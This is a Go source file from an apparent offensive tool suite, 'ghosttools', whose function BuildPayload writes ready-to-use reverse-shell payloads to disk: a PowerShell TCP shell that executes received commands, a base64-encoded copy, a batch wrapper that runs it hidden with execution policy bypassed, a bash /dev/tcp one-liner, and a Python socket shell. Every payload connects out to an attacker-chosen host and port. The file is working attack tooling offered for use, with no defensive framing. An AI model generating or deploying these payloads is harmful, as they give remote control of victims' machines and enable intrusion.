package malicious

import (
	"encoding/base64"
	"fmt"
	"os"
	"path/filepath"

	"ghosttools/internal/ui"
)

// BuildPayload produces a reverse shell payload in multiple formats.
// Called from other malicious tools as a helper.
func BuildPayload(lhost, lport string) {
	out := "ghosttools_payloads"
	os.MkdirAll(out, 0755)

	ps := fmt.Sprintf(`$c=New-Object Net.Sockets.TCPClient('%s',%s);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()`, lhost, lport)

	// powershell
	os.WriteFile(filepath.Join(out, "shell.ps1"), []byte(ps), 0644)

	// base64-encoded ps one-liner
	enc := base64.StdEncoding.EncodeToString([]byte(ps))
	os.WriteFile(filepath.Join(out, "shell_b64.txt"), []byte(enc), 0644)

	// batch wrapper
	bat := "powershell -ep bypass -NoP -W Hidden -Enc " + enc
	os.WriteFile(filepath.Join(out, "shell.bat"), []byte(bat), 0644)

	// bash reverse shell
	bash := fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", lhost, lport)
	os.WriteFile(filepath.Join(out, "shell.sh"), []byte(bash), 0644)

	// python reverse shell
	py := fmt.Sprintf(`import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("%s",%s))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])`, lhost, lport)
	os.WriteFile(filepath.Join(out, "shell.py"), []byte(py), 0644)

	ui.Green("payloads written to ./" + out + "/")
}